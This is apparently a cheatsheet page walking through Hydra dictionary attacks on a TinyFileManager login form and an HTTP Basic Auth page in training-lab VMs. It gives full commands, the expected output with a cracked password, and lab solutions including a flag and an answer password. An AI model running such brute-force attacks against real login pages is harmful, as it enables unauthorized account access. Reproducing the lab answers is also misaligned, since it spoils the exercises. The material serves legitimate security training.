# HTTP POST Login Form

Login page of TinyFileManager
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/HTTP-POST-Login-Form-1.png)

Intercepted Login Request
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/HTTP-POST-Login-Form-2.png)

Intercepted Login Request (2)
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/HTTP-POST-Login-Form-3.png)

Successful Dictionary Attack on the Login Form
>``` shell
>kali@kali:~$ hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
>
># ========== Expected Result ==========
>...
>[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
>[DATA] attacking http-post-form://192.168.50.201:80/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid username or password
>[STATUS] 64.00 tries/min, 64 tries in 00:01h, 14344335 to do in 3735:31h, 16 active
>[80][http-post-form] host: 192.168.50.201   login: user   password: 121212
>1 of 1 target successfully completed, 1 valid password found
>...
># =====================================
>```

Successful Login
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/HTTP-POST-Login-Form-4.png)

Lab 1 - Follow the steps from this section to gain access to TinyFileManager on VM #1 (BRUTE). Once logged in, find the flag.
>``` shell
># 1) Perform a dictionary attack against the TinyFileManager web login using Hydra (-l specifies the username, -P specifies the password list) (http-post-form is used to brute-force the web login form)
>kali@kali:~$ hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.243.201 \
>http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
>
># 2) Navigate to the TinyFileManager web interface in a browser (URL: http://192.168.243.201)
>
># 3) Log in using the credentials discovered by Hydra (user / 121212)
>
># 4) After successful login, locate and open the file named install.txt
>
># 5) Read the contents of install.txt to retrieve the flag and complete the lab
>```
>OS{d3469592b23444bcb26a671ea9d3a65d}

Lab 2 - The web page on VM #2 is password protected. Use Hydra to perform a password attack and get access as user admin. Once you have identified the correct password, enter it as the answer to this exercise.
>``` shell
># 1) Perform a dictionary attack against the password-protected web page using Hydra (-l specifies the username, -P specifies the password list) (http-get is used because the page uses HTTP Basic Authentication)
>kali@kali:~$ hydra -l admin -P /usr/share/wordlists/rockyou.txt \
>192.168.243.201 http-get
>
># 2) Review Hydra output to identify the valid password for user "admin" (This password is the answer to the exercise)
>```
>789456
